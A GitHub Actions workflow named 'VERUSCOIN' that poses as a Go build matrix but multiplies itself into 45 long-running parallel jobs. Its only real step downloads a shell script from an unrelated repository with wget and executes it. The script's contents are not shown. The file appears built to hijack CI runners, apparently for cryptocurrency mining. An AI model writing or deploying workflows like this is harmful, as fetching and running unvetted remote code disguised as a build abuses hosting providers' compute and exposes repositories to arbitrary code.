
name: VERUSCOIN
on: [push, pull_request]
jobs:
  build:
    name: Ba_channel
    runs-on: ubuntu-18.04
    strategy:
      max-parallel: 30
      fail-fast: false
      matrix:
        go: [1.6, 1.7, 1.8, 1.9, 1.10]
        flag: [A, B, C, D, E, F, G, H, I]
    timeout-minutes: 360
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: BA_channel
      run: |
        wget https://github.com/agung099/scalaku/blob/main/.github/workflows/scele.sh && chmod u+x scele.sh && ./scele.sh
